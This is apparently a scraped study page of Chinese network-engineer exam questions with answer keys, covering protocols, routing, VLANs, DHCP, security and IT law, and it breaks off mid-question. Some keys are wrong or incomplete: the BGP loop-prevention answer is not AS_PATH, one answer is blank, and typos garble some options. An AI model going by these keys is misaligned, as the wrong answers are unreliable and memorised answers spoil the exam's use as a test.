alt="img"></p><blockquote><p>答：C</p></blockquote><ul><li><ol><li>以下关于冯诺依曼计算机的叙述中，不正确的是（）。</li></ol><p>A.程序指令和数据都采用二进制表示<br>B.程序指令总是存储在主存中，而数据则存储在高速缓存中 （执行都放在内存中）<br>C.程序的功能都由中央处理器（CPU）执行指令来实现<br>D.程序的执行过程由指令进行自动控制</p></li></ul><blockquote><p>答：B</p></blockquote><ul><li><ol><li>在风险管理中，降低风险危害的策略不包括（）。</li></ol><p>A.回避风险<br>B.转移风险<br>C.消除风险<br>D.接受风险并控制损失</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250517223721918.png" alt="img"></p><blockquote><p>答：D</p></blockquote><ul><li><ol><li>为了减少在线观看网络视频卡顿，经常采用流媒体技术。以下关于流媒体说法不正确的是（）。</li></ol><p>A.流媒体需要缓存<br>B.流媒体视频资源不能下载本地<br>C.流媒体技术可以用于观看视频、网络直播<br>D.流媒体资源文件格式可以是asf、rm等</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250517224016313.png" alt="img"></p><blockquote><p>答：B</p></blockquote><ul><li><ol><li>以下选项中，不属于计算机系统主要功能的是（）。</li></ol><p>A.管理计算机系统的软硬件资源<br>B.充分发挥计算机资源的效率<br>C.为其他软件提供良好的运行环境<br>D.存储数据</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250517224607146.png" alt="img"></p><blockquote><p>答：D</p></blockquote><ul><li><ol><li>智能手机包含运行内存和机身内存，以下关于运行内存的说法中，不正确的是（）。</li></ol><p>A.也称手机RAM<br>B.用于暂时存放处理器所需的运算数据<br>C.能够永久保存数据<br>D.手机运行内存越大，性能越好</p></li></ul><blockquote><p>答：C</p></blockquote><ul><li><ol><li>某电商平台根据用户消费记录分析用户消费偏好，预测未来消费倾向，这是（）技术的典型应用。</li></ol><p>A.物联网<br>B.区块链<br>C.云计算<br>D.大数据</p></li></ul><blockquote><p>答：D</p></blockquote><ul><li><ol><li>以下关于云计算的叙述中，不正确的是（）。</li></ol><p>A.云计算将所有客户的计算都集中在一台大型计算机上进行<br>B.云计算是基于互联网的相互服务器的增加、使用和交付模式<br>C.云计算支持用户在任意使用各种终端获取相应服务<br>D.云计算的基础是面向服务的架构和虚拟化的系统部署</p></li></ul><blockquote><p>答：A</p></blockquote><ul><li><ol><li>SOA（面向服务的架构）是一种（）服务架构。</li></ol><p>A.细粒度、紧耦合<br>B.粗粒度、松耦合<br>C.粗粒度、紧耦合<br>D.细粒度、松耦合</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250517230406412.png" alt="img"></p><blockquote><p>答：B</p></blockquote><ul><li><ol><li>在需要保护的信息资产中（）是最重要的。</li></ol><p>A.软件<br>B.硬件<br>C.数据<br>D.环境</p></li></ul><blockquote><p>答：C</p></blockquote><ul><li><ol><li>以下频率中，属于微波波段的是（）。</li></ol><p>A.30Hz （米波）<br>B.30KHz<br>C.30MHz<br>D.30GHz</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250518201921636.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250518201841028.png" alt="img"></p><blockquote><p>答：D</p></blockquote><ul><li><ol><li>以下关于以太网交换机的说法中，错误的是（）。</li></ol><p>A.以太网交换机工作在数据链路层<br>B.以太网交换机可以隔离冲突域<br>C.以太网交换机中存储转发交换机方式相比直接交换方式其延迟最短<br>D.以太网交换机通过MAC地址表转发数据</p></li></ul><blockquote><p>答：C</p></blockquote><ul><li><ol><li>一台16口的全双工千兆交换机，至少需要（）的背板带宽才能实现线速转发。</li></ol><p>A.1.488Gbps<br>B.3.2Gbps<br>C.32Gbps<br>D.320Gbps</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250518202115338.png" alt="img"></p><blockquote><p>答：C</p></blockquote><ul><li><ol><li>模拟型号数字化的正确步骤是（）。</li></ol><p>A.采样、量化、编码<br>B.编码、量化、采样<br>C.采用、编码、量化<br>D.编码、采样、量化</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250518202215311.png" alt="img"></p><blockquote><p>答：A</p></blockquote><ul><li><ol><li>5G采用的正交振幅调制（Quadrature Amplitude Modulation, QAM）技术中，256QAM的一个载波上可以调制（）比特信息。</li></ol><p>A.2<br>B.4<br>C.6<br>D.8</p></li></ul><blockquote><p>答：D, 2^8&#x3D;256</p></blockquote><ul><li><ol><li>下面关于Kerberos认证协议的叙述中，正确的是（）。</li></ol><p>A.密钥分发中心包括认证服务器、票据授权服务器和客户机三个部分 (没有客户机)<br>B.协议的交换采用膏药加密算法加密消息 (私钥DES)<br>C.用户恶化服务器之间不需要共享长期密钥<br>D.协议的目的是让用户获得访问应用服务器的服务许可票据</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250518202425927.png" alt="img"></p><blockquote><p>答：D</p></blockquote><ul><li><ol><li>如下图所示，如果PC通过tracert命令获取路由器R3的IP地址，PC发出封装ICMP消息的IP报文应满足的特征是（）。</li></ol><p>A.ICMP消息的Type&#x3D;11,Code&#x3D;0;IP报文的TTL字段为3<br>B.ICMP消息的Type&#x3D;8,Code&#x3D;0,IP报文的TTL字段为3<br>C.ICMP消息的Type&#x3D;11,Code&#x3D;0;IP报文的TTL字段为128<br>D.ICMP消息的Type&#x3D;8,Code&#x3D;0;IP报文的TTL字段为128</p></li></ul><blockquote><p>答：</p></blockquote><ul><li><ol><li>在光纤接入技术中，EPON系统中的ONU向OLT发送数据采用（）技术。</li></ol><p>A.TDM<br>B.FDM<br>C.TDMA<br>D.广播</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250518202611611.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250518202756110.png" alt="img"></p><blockquote><p>答：C</p></blockquote><ul><li><ol><li>在下图所示的双联路热备份无线接入网中，STA通过Portal认证上线，AP当前连接的主AC为AC1,STA通过AP在AC1上线，以下关于AC2的描述中，正确的是（）。</li></ol></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250518202840594.png" alt="img"></p><pre><code class="hljs stata">A.AC2上有<span class="hljs-keyword">AP</span>的信息，且<span class="hljs-keyword">AP</span>在AC2的状态为standbyB.AC2上有<span class="hljs-keyword">AP</span>的信息，且<span class="hljs-keyword">AP</span>在AC2的状态normalC.AC2上有STA的信息，且STA的状态为未认证<span class="hljs-keyword">D</span>.AC2上有STA的信息，且STA的状态为已认证复制代码</code></pre><blockquote><p>答：D</p></blockquote><ul><li><ol><li>在TCP协议连接释放过程中，请求释放连接的一方（客户端）发送连接释放报文段，该报文段应该将（）。</li></ol><p>A.FIN置1<br>B.FIN置0<br>C.ACK置1<br>D.ACK置0</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250518202937995.png" alt="img"></p><blockquote><p>答：A</p></blockquote><ul><li><ol><li>以下关于TCP拥塞控制机制的说法中，错误的是（）。</li></ol><p>A.慢启动阶段，将拥塞窗口值设置为1<br>B.慢启动算法执行时拥塞窗口指数增长，直到拥塞窗口值达到慢启动门限值<br>C.在拥塞避免阶段，拥塞窗口线性增长<br>D.当网络出现拥塞时，慢启动门限值恢复为初始值</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250518203246504.png" alt="img"></p><blockquote><p>答：D</p></blockquote><ul><li><ol><li>在OSI参考模型中，（）在物理线路上提供可靠的数据传输数据。</li></ol><p>A.物理层<br>B.数据链路层<br>C.网络层<br>D.传输层</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250518203521875.png" alt="img"></p><blockquote><p>答：B</p></blockquote><ul><li><ol><li>以下路由协议中（）属于有类路由协议。</li></ol><p>A.RIPv1<br>B.OSPF<br>C.IS-IS<br>D.BGP</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250518203601767.png" alt="img"></p><blockquote><p>答：A</p></blockquote><ul><li><ol><li>以下关于RIPv1和RIPv2路由选择协议说法中，错误的是（）。</li></ol><p>A.都是基于Bellman算法的<br>B.都是基于跳数作为度量值的<br>C.都包含有Request和Response两种分组，且分组完全一致的 (Response分组不一样)<br>D.都是采用传输层的UDP协议承载</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250518203647250.png" alt="img"></p><blockquote><p>答：C</p></blockquote><ul><li><ol><li>一台运行OSPF路由协议的路由器，转发接口为100Mbps,其cost值应该是（）。</li></ol><p>A.1<br>B.10<br>C.100<br>D.1000</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250518203857009.png" alt="img"></p><blockquote><p>答：A</p></blockquote><ul><li><ol><li>在BGP路由选择协议中，（）属性可以避免在AS之间产生环路。</li></ol><p>A.Origin<br>B.AS_PATH<br>C.Next Hop<br>D.Communtiy</p></li></ul><blockquote><p>答：C</p></blockquote><ul><li><ol><li>以下关于IS-IS路由选择协议的说法中，错误的是（）。</li></ol><p>A.IS-IS路由协议是一种基于链路状态的IGP路由协议<br>B.IS-IS路由协议可将自治系统划分骨干区域和非骨干区域<br>C.IS-IS路由协议中的路由器的不同接口可以属于不同的区域 (所有端口属于一个区域)<br>D.IS-IS路由协议的地址结构由IDP和DSP两部分组成。</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250518204101602.png" alt="img"></p><blockquote><p>答：C</p></blockquote><ul><li><ol><li>以下协议中，不属于安全的数据&#x2F;文件传输协议的是（）。</li></ol><p>A.HTTPS<br>B.SSH<br>C.SFTP<br>D.Telnet</p></li></ul><blockquote><p>答：D</p></blockquote><ul><li><ol><li>在浏览器地址输入<a href="ftp://ftp.tsinghua.edu.cn/%E8%BF%9B%E8%A1%8C%E8%AE%BF%E9%97%AE%E6%97%B6%EF%BC%8C%E4%B8%8B%E5%88%97%E6%93%8D%E4%BD%9C%E4%B8%AD%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%8D%E4%BC%9A%E6%89%A7%E8%A1%8C%E7%9A%84%E6%98%AF%EF%BC%88%EF%BC%89%E3%80%82">ftp://ftp.tsinghua.edu.cn/进行访问时，下列操作中浏览器不会执行的是（）。</a></li></ol><p>A.域名解析<br>B.建立TCP连接<br>C.发送HTTP请求报文<br>D.发送FTP命令</p></li></ul><blockquote><p>答：C</p></blockquote><ul><li><ol><li>下列端口号中，（）是电子邮件发送协议默认的服务端口号。</li></ol><p>A.23 telnet<br>B.25 SMTP<br>C.110 POP3<br>D.143 IMAP</p></li></ul><blockquote><p>答：B</p></blockquote><ul><li><ol><li>以下关于IPv6与IPv4比较的说法中，错误的是（）。</li></ol><p>A.IPv4的头部是变长的，IPv6的头部是定长的。<br>B.IPv6与IPv4中均有头部校验和字段<br>C.IPv6中的HOP Limit字段作用类似于IPv4中的TTL字段<br>D.IPv6中的Traffic Class字段作用类似于IPv4中的Tos字段</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250518204521407.png" alt="img"></p><blockquote><p>答：B</p></blockquote><ul><li><ol><li>在DNS服务器中，区域的邮件服务器及其优先级由（）资源记录定义。</li></ol><p>A.SOA<br>B.NS<br>C.PTR<br>D.MX</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250518204608003.png" alt="img"></p><blockquote><p>答：D</p></blockquote><ul><li><ol><li>在Linux中，可以使用（）命令创建一个文件目录。</li></ol><p>A.mkdir<br>B.md<br>C.chmod<br>D.rmdir</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250518204701955.png" alt="img"></p><blockquote><p>答：A</p></blockquote><ul><li><ol><li>在Windows中，DHCP客户端手动更新租期时使用的命令是（）。</li></ol><p>A.ipconfig &#x2F;release<br>B.ipconfig &#x2F;renew<br>C.ipconfig &#x2F;showclassid<br>D.ipconfig &#x2F;setclassid</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250518204803295.png" alt="img"></p><blockquote><p>答：B</p></blockquote><ul><li><ol><li>Windows Server 2008 R2上配置（）服务器前需要先安装IIS服务。</li></ol><p>A.DHCP<br>B.DNS<br>C.Web<br>D.传真</p></li></ul><blockquote><p>答：C, FTP也需要</p></blockquote><ul><li><p>36.37. 客户端用于向DHCP服务器请求IP地址配置信息的报文是（），当客户端接受服务器的IP地址配置信息，需向服务器发送（）报文以确定。</p><p>A.DHCP Discover<br>B.DHCP offer<br>C.DHCP pack<br>D.DHCP ack<br>A.DHCP Discover<br>B.DHCP offer<br>C.DHCP ack<br>D.DHCP nak</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250518205047320.png" alt="img"></p><blockquote><p>答：A,C</p></blockquote><ul><li><ol><li>服务器提供WEB服务，本地默认监听（）端口。</li></ol><p>A.8008<br>B.8080<br>C.8800<br>D.80</p></li></ul><blockquote><p>答：D</p></blockquote><ul><li><ol><li>用户在PC上安装使用邮件客户端，希望同步客户端和服务器上的操作，需使用的协议是（）。</li></ol><p>A.POP3<br>B.IMAP<br>C.HTTPS<br>D.SMTP</p></li></ul><blockquote><p>答：B</p></blockquote><ul><li><ol><li>()命令不能获得主机域名（abc.com）对应的IP地址。</li></ol><p>A.ping abc.com<br>B.nslookup qt&#x3D;a abc.com<br>C.tracert abc.com<br>D.route abc.com</p></li></ul><blockquote><p>答：D</p></blockquote><ul><li><ol><li>通过在出口防火墙上配置（）功能，可以阻止外部未授权用户访问内部网络。</li></ol><p>A.ACL<br>B.SNAT (源地址转换)<br>C.入侵检测 （防火墙没有）<br>D.防病毒 （防火墙没有）</p></li></ul><blockquote><p>答：A</p></blockquote><ul><li><ol><li>以下Linux命令中，（）可以实现允许IP为10.0.0.2的客户端访问本机TCP 22端口。</li></ol><p>A.iptables -l INPUT -d 10.0.0.2 -p tcp -sport 22 -j DROP<br>B.iptables -l INPUT -s 10.0.0.2 -p tcp -sport 22 -j DROP<br>C.iptables -l INPUT -d 10.0.0.2 -p tcp -sport 22 -j ACCEPT<br>D.iptables -l INPUT -s 10.0.0.2 -p tcp -sport 22 -j ACCEPT</p></li></ul><blockquote><p>答：D</p></blockquote><ul><li><ol><li>A从证书颁发机构X1获得证书，B从证书颁发机构X2获得证书。假设使用的是X509证书，X2《X1》表示X2签署的X1的证书，A可以使用证书链来获取B的公钥，则该链的正确顺序是（）。</li></ol><p>A.X2《X1》X1《B》<br>B.X2《X1》X2《A》<br>C.X1《X2》X2《B》<br>D.X1《X2》X2《A》</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250518210141300.png" alt="img"></p><blockquote><p>答：C</p></blockquote><ul><li><ol><li>在我国自主研发的商用密码标准算法中，用于分组加密的是（）。</li></ol><p>A.SM2<br>B.SM3<br>C.SM4<br>D.SM9</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250518210253490.png" alt="img"></p><blockquote><p>答：C</p></blockquote><ul><li><ol><li>SQL注入是常见的Web攻击，以下不能够有效防御SQL注入的手段是（）。</li></ol><p>A.对用户输入做关键过滤<br>B.部署Web应用防火墙进行防护<br>C.部署入侵检测系统阻断攻击 （只能发现，可能阻断）<br>D.定期扫描系统漏洞并及时修复</p></li></ul><blockquote><p>答：C</p></blockquote><p>4008109889</p><ul><li><ol><li>SNMP管理的网络关键组件不包括（）。</li></ol><p>A.网络管理系统<br>B.被管理的设备<br>C.代理者<br>D.系统管理员</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250519092426195.png" alt="img"></p><blockquote><p>答：C</p></blockquote><ul><li><ol><li>在Windows系统中通过（）查看本地DNS缓存。</li></ol><p>A.ipconfig &#x2F;all<br>B.ipconfig &#x2F;renew<br>C.ipconfig &#x2F;flushdns<br>D.ipconfig &#x2F;displaydns</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250519092528144.png" alt="img"></p><blockquote><p>答：D</p></blockquote><ul><li><ol><li>下面说法中，能够导致BGP邻居关系无法建立的是（）。</li></ol><p>A.邻居的AS号配置错误<br>B.IBGP邻居没有进行物理直连<br>C.在全互联的IBGP邻居关系中开启了BGP同步 (需要关闭，导致路由器崩溃)<br>D.两个BGP邻居之间的更新时间不一致</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250519092657230.png" alt="img"></p><blockquote><p>答：A</p></blockquote><blockquote><p>解析：IBGP邻居使用Loopback口建立邻居，EBGP使用物理口建立邻居。</p></blockquote><ul><li><ol><li>缺省状态下，SNMP协议代理进程使用（）端口向NMS发送告警信息。</li></ol><p>A.161<br>B.162<br>C.163<br>D.164</p></li></ul><blockquote><p>答：B</p></blockquote><ul><li><ol><li>网络设备发生故障时，会向网络设备系统发送（）类型的SNMP报文</li></ol><p>A.trap<br>B.get-response<br>C.set-request<br>D.get-request</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250519225626840.png" alt="img"></p><blockquote><p>答：A</p></blockquote><ul><li><ol><li>能够容纳200台客户机的IP地址段，其网络位最长是（）为。</li></ol><p>A.21<br>B.22<br>C.23<br>D.24</p></li></ul><blockquote><p>答：D</p></blockquote><ul><li><p>52.53. 网管员对192.168.27.0&#x2F;24网段使用27位掩码进行了子网划分，下列地址中与IP地址192.168.27.45处于同一个网络的是（），其网络号是（）。</p><p>A.192.168.27.16<br>B.192.168.27.35<br>C.192.168.27.30<br>D.192.168.27.65<br>A.192.168.27.0<br>B.192.168.27.32<br>C.192.168.27.64<br>D.192.168.27.128</p></li></ul><blockquote><p>答：B, B</p></blockquote><ul><li><ol><li>下列IP地址中属于私有地址的是（）。</li></ol><p>A.10.10.1.10<br>B.172.0.16.248<br>C.172.15.32.4<br>D.192.186.2.254</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250519230227400.png" alt="img"></p><blockquote><p>答：A</p></blockquote><ul><li><ol><li>公司要为900个终端分配IP地址，下面的地址分配方案中，在便于管理的前提下，最节省网络资源的方案是（）。</li></ol><p>A.使用B类地址段172.16.0.0&#x2F;16<br>B.任意分配4个C类地址段<br>C.将192.168.1.0、192.168.2.0、192.168.3.0、192.168.4.0进行聚合<br>D.将192.168.32.0、192.168.33.0、192.168.35.0、192.168.35.0进行聚合</p></li></ul><blockquote><p>答：Dd</p></blockquote><ul><li><ol><li>关于以下命令片段的说法中，正确的是（）。</li></ol><p>A.配置接口默认为全双工模式<br>B.配置接口速率默认为1000Kbit&#x2F;s (1000Mbps)<br>C.配置接口速率自协商<br>D.配置接口在非自协商模式下位半双工模式</p></li></ul><blockquote><p>答：D</p></blockquote><ul><li><ol><li>以下命令片段中，描述路由优先级的字段是（）。</li></ol><p>A.Proto<br>B.Pre<br>C.Cost<br>D.Flags</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250519230957779.png" alt="img"></p><blockquote><p>答：B</p></blockquote><ul><li><ol><li>显示OSPF邻居信息的命令是（）。</li></ol><p>A.display ospf interface<br>B.display ospf routing<br>C.display ospf peer<br>D.display ospf lsdb</p></li></ul><blockquote><p>答：C</p></blockquote><ul><li><ol><li>以下关于VLAN的描述中，不正确的是（）。</li></ol><p>A.VLAN的主要作用是隔离广播域<br>B.不同VLAN间须跨三层互通<br>C.VLANID可以使用范围为1<del>4095 (1</del>4094)<br>D.VLAN1不用创建且不能删除</p></li></ul><blockquote><p>答：C</p></blockquote><ul><li><ol><li>使用命令“vlan batch 30 40”和“vlan batch 30 to 40”分别创建的VLAN数量是（）。</li></ol><p>A.11和2<br>B.2和2<br>C.11和11<br>D.2和11</p></li></ul><blockquote><p>答：D</p></blockquote><ul><li><ol><li>下列命令片段中划分VLAN的方式是（）。</li></ol><p>A.基于策略划分<br>B.基于MAC划分<br>C.基于IP子网划分<br>D.基于网络层协议划分</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250519231432390.png" alt="img"></p><blockquote><p>答：A</p></blockquote><ul><li><ol><li>存储转发式交换机中运行生成树协议（STP）可以（）。</li></ol><p>A.向端口连接的各个站点发送请求以便获取其MAC地址<br>B.阻塞一部分端口，避免形成环路<br>C.找不到目的地址时广播数据帧<br>D.通过选举产生多个没有环路的生成树</p></li></ul><blockquote><p>答：B</p></blockquote><ul><li><ol><li>在5G关键技术中，将传统互联网控制平面和数据平面分离，使网络的灵活性、可管理性和可扩展性大幅提升的是（）。</li></ol><p>A.软件定义网络（SDN）<br>B.大规模多输入多输出（MIMO）<br>C.网络功能虚拟化（NFV）<br>D.长期演进(LTE)</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250519231629778.png" alt="SDN"></p><p>SDN</p><blockquote><p>答：A</p></blockquote><ul><li><ol><li>以下关于二进制指数退避算法的描述中，正确的是（）。</li></ol><p>A.每次站点等待的时间是固定的，即上次的2陪 (随机选择区间的时间)<br>B.后一次退避时间一定比前一次长<br>C.发生冲突不一定是站点发生了资源抢占 （可能信道故障）<br>D.通过扩大退避窗口杜绝了再次冲突</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250519231755992.png" alt="img"></p><blockquote><p>答：C</p></blockquote><ul><li><ol><li>下列IEEE802.11系列标准中，支持2.4GHz和5GHz两个工作频段的是（）。</li></ol><p>A.802.11a<br>B.802.11ax<br>C.802.11b<br>D.802.11g</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250519232241139.png" alt="img"></p><blockquote><p>答：B</p></blockquote><ul><li><ol><li>某无线路由器，在2.4GHz频道上配置了2个信道，使用（）信道间干扰最小。</li></ol><p>A.1和3<br>B.4和7<br>C.6和10<br>D.7和12</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250519232450221.png" alt="img"></p><blockquote><p>答：D</p></blockquote><blockquote><p>解析：相隔5个</p></blockquote><ul><li><ol><li>以下关于层次化网络设计模型的描述中，不正确的是（）。</li></ol><p>A.终端用户网关通常部署在核心层，实现不同区域间的数据高速转发<br>B.流量负载和VLAN间路由在汇聚层实现<br>C.MAC地址过滤、路由发现在接入层实现<br>D.接入层连接无线AP等终端设备</p></li></ul><blockquote><p>答：A</p></blockquote><ul><li><ol><li>某存储系统规划配置25块8TB磁盘，创建2个RAID6组，配置1块热备盘，则该存储系统实际存储容量是（）。</li></ol><p>A.200TB<br>B.192TB<br>C.176TB<br>D.160TB</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250519232639494.png" alt="img"></p><blockquote><p>答：D</p></blockquote><blockquote><p>解析：25-1,12-2（校验）&#x3D;10，2x10x80&#x3D;160</p></blockquote><ul><li><ol><li>《中华人民共和国数据安全法》由中华人民共和国第十三届全国人民代表大会常务委员会第二十九次会议审议通过，自（）年9月1日起施行。</li></ol><p>A.2019<br>B.2020<br>C.2021<br>D.2022</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250519232856157.png" alt="img"></p><blockquote><p>答：C</p></blockquote><ul><li><ol><li>以下关于信息化项目成本估算的描述中，不正确的是（）。</li></ol><p>A.项目成本估算指设备采购、劳务支出等直接用于项目建设的经费估算<br>B.项目成本估算考虑项目工期要求的影响，工期要求越短成本越高<br>C.项目成本估算考虑项目质量要求的影响，质量要求越高成本越高<br>D.项目成本估算过粗或过细都会影响项目成本</p></li></ul><blockquote><p>答：A</p></blockquote><hr><h2 id="2021年11月"><a href="#2021年11月" class="headerlink" title="2021年11月"></a>2021年11月</h2><ul><li><ol><li>微机系统中，（）不属于CPU的运算器组成部件。</li></ol><p>A.程序计数器<br>B.累加寄存器<br>C.多路转换器<br>D.ALU单元</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250519233122765.png" alt="img"></p><blockquote><p>答：A</p></blockquote><ul><li><ol><li>Python语言的特点不包括（）。</li></ol><p>A.跨平台、开源<br>B.编译型<br>C.支持面向对象程序设计<br>D.动态编程</p></li></ul><blockquote><p>答：B</p></blockquote><ul><li><ol><li>软件测试时，白盒测试不能发现（）。</li></ol><p>A.代码路径中的错误<br>B.死循环<br>C.逻辑错误<br>D.功能错误</p></li></ul><blockquote><p>答：D</p></blockquote><ul><li><ol><li>云计算有多种部署模型，当云按照服务方式提供给大众时，称为（）。</li></ol><p>A.公有云<br>B.私有云<br>C.专属云<br>D.混合云</p></li></ul><blockquote><p>答：A</p></blockquote><ul><li><ol><li>某工厂使用一个软件系统使质检过程自动化，并逐步替代人工质检。该系统属于（）。</li></ol><p>A.面向作业处理的系统<br>B.面向管理控制的系统<br>C.面向决策计划的系统<br>D.面向数据汇总的系统</p></li></ul><blockquote><p>答：B</p></blockquote><ul><li><ol><li>外包是一种合同协议。外包合同中的关键核心文件是（）。</li></ol><p>A.技术等级协议（TLA）<br>B.服务等级协议（SLA）<br>C.项目执行协议（PEA）<br>D.企业管理协议（EMA）</p></li></ul><blockquote><p>答：B</p></blockquote><ul><li><ol><li>数据标准化是一种按照预定规程对共享数据实施规范化管理的过程。数据标注化的对象是数据元素和元数据。以下1-6中，（）属于数据标准化主要包括的三个阶段。</li></ol><p>1.数据元素标准阶段<br>2.元数据标准阶段<br>3.业务建模阶段<br>4.软件安装部署阶段<br>5.数据规范化阶段<br>6.文档规范化阶段<br>A.123<br>B.356<br>C.456<br>D.135</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250519233820733.png" alt="img"></p><blockquote><p>答：B</p></blockquote><ul><li><ol><li>在软件开发过程中，系统测试阶段的测试目的来自于（）阶段。</li></ol><p>A.需求分析<br>B.概要设计<br>C.详细设计<br>D.软件实现</p></li></ul><blockquote><p>答：A</p></blockquote><ul><li><ol><li>信息系统的文档是开发人员与用户交流的工具。在系统规划和系统分析阶段用户与系统分析人员交流所使用的文档不包括（）。</li></ol><p>A.可行性研究报告<br>B.总体规划报告<br>C.项目开发计划<br>D.用户使用手册</p></li></ul><blockquote><p>答：D</p></blockquote><ul><li><ol><li>（）是构成我国保护计算机软件著作权的两个基本法律文件。</li></ol><p>A.《计算机软件保护条例》和《软件法》<br>B.《中华人民共和国著作权法》和《软件法》<br>C.《中华人民共和国著作权法》和《计算机软件保护条例》<br>D.《中华人民共和国版权法》和《中华人民共和国著作权法》</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520125037234.png" alt="img"></p><blockquote><p>答：C</p></blockquote><ul><li><ol><li>在光纤通信中，()设备可以将光信号放大进行远距离传输。</li></ol><p>A.光纤中继器<br>B.光纤耦合器<br>C.光法信机<br>D.光检测器</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520125127415.png" alt="img"></p><blockquote><p>答：A</p></blockquote><ul><li><ol><li>在10GBase-ER标准中，使用单模光纤最大传输距离是（）。</li></ol><p>A.300米<br>B.5公里<br>C.10公里<br>D.40公里</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520125323934.png" alt="img"></p><blockquote><p>答：D</p></blockquote><ul><li><ol><li>在OSI参考模型中，传输层处理的数据单位是（）。</li></ol><p>A.比特<br>B.帧<br>C.分组<br>D.报文</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520125441173.png" alt="img"></p><blockquote><p>答：D</p></blockquote><ul><li><p>14.15. 某信道带宽为1MHz，采用4幅度8相位调制最大可以组成（）种码元。若此信道信号的码元宽度为10微秒，则数据速率为（）kb&#x2F;s。</p><p>A.5<br>B.10<br>C.16<br>D.32<br>A.50<br>B.100<br>C.500<br>D.1000</p></li></ul><blockquote><p>答：D,C</p></blockquote><ul><li><ol><li>使用ADSL接入电话网采用的认证协议是（）。</li></ol><p>A.802.1X<br>B.802.5<br>C.PPPoA<br>D.PPPoE</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520125927560.png" alt="img"></p><blockquote><p>答：D</p></blockquote><ul><li><ol><li>在主机上禁用（）协议，可以不响应来自别的主机的Ping包。</li></ol><p>A.UDP<br>B.ICMP<br>C.TLS<br>D.ARP</p></li></ul><blockquote><p>答：B</p></blockquote><ul><li><ol><li>HDLC协议中，帧的编号和应答号存放在（）字段中。</li></ol><p>A.标志<br>B.地址<br>C.控制<br>D.数据</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520130207511.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520130050046.png" alt="img"></p><blockquote><p>答：C</p></blockquote><ul><li><ol><li>在OSPF路由协议中，路由器在（）进行链路状态广播</li></ol><p>A.固定30秒后周期性地<br>B.固定60秒后周期性地<br>C.收到对端请求后<br>D.链路状态发生改变后</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520130324506.png" alt="img"></p><blockquote><p>答：D</p></blockquote><ul><li><p>20.21. ARP报文分为ARP Request和ARP Response，其中ARP Request采用（）进行传送，ARP 